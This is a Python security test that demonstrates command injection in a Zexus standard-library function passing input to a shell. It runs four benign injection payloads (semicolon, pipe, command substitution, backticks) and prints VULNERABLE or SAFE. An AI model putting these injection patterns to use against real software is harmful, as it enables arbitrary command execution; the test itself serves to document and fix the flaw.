"""
TEST 01: Command Injection via os_module.py subprocess shell=True
=================================================================

VULNERABILITY: OSModule.execute() passes user input directly to subprocess.run()
with shell=True, enabling arbitrary command injection.

LOCATION: src/zexus/stdlib/os_module.py, line 116-125

SEVERITY: CRITICAL - Remote Code Execution (RCE)

ATTACK VECTOR: Any Zexus program calling os.execute() can inject shell commands
via metacharacters like ; | && ` $() etc.
"""

import sys
import os
import tempfile

# Add project source to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'src'))

from zexus.stdlib.os_module import OSModule


def test_command_injection():
    """Demonstrate command injection via shell metacharacters."""
    results = []

    # --- Payload 1: Semicolon injection ---
    # A user calls os.execute("echo hello") but attacker controls input:
    #   os.execute("echo hello; id")
    # The "; id" part runs an additional command.
    marker = tempfile.mktemp(suffix=".cmd_injection_test")
    payload1 = f"echo clean; touch {marker}"
    result = OSModule.execute(payload1)
    injected = os.path.exists(marker)
    if injected:
        os.unlink(marker)  # Clean up
    results.append({
        "payload": payload1,
        "type": "semicolon_injection",
        "exploited": injected,
        "detail": f"File created at {marker}" if injected else "Blocked",
    })

    # --- Payload 2: Pipe injection ---
    payload2 = "echo secret_data | cat"
    result2 = OSModule.execute(payload2)
    pipe_worked = result2.get("stdout", "").strip() == "secret_data"
    results.append({
        "payload": payload2,
        "type": "pipe_injection",
        "exploited": pipe_worked,
        "detail": f"stdout={result2.get('stdout', '').strip()!r}",
    })

    # --- Payload 3: Command substitution ---
    payload3 = "echo $(whoami)"
    result3 = OSModule.execute(payload3)
    subst_worked = result3.get("returncode") == 0 and len(result3.get("stdout", "").strip()) > 0
    results.append({
        "payload": payload3,
        "type": "command_substitution",
        "exploited": subst_worked,
        "detail": f"stdout={result3.get('stdout', '').strip()!r}",
    })

    # --- Payload 4: Backtick injection ---
    payload4 = "echo `id`"
    result4 = OSModule.execute(payload4)
    backtick_worked = result4.get("returncode") == 0 and "uid=" in result4.get("stdout", "")
    results.append({
        "payload": payload4,
        "type": "backtick_injection",
        "exploited": backtick_worked,
        "detail": f"stdout={result4.get('stdout', '').strip()!r}",
    })

    return results


if __name__ == "__main__":
    print("=" * 70)
    print("TEST 01: Command Injection via OSModule.execute()")
    print("=" * 70)
    for r in test_command_injection():
        status = "VULNERABLE" if r["exploited"] else "SAFE"
        print(f"\n[{status}] {r['type']}")
        print(f"  Payload: {r['payload']}")
        print(f"  Detail:  {r['detail']}")
